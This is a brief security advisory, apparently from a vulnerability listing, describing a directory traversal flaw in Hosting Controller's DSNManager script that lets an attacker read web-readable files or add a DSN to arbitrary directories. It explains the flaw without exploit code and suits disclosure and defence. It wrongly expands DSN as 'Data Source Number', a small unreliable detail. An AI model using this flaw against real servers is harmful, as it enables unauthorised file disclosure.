Hosting Controller is an application which consolidates all hosting tasks into one interface. Hosting Controller runs on Microsoft Windows operating systems.

The DSNManager script does not sufficiently filter dot-dot-slash (../) sequences from URL parameters, making it prone to directory traversal attacks. An attacker can exploit this condition to disclose the contents of arbitrary web-readable files or potentially add a DSN (Data Source Number) to an arbitrary directory.
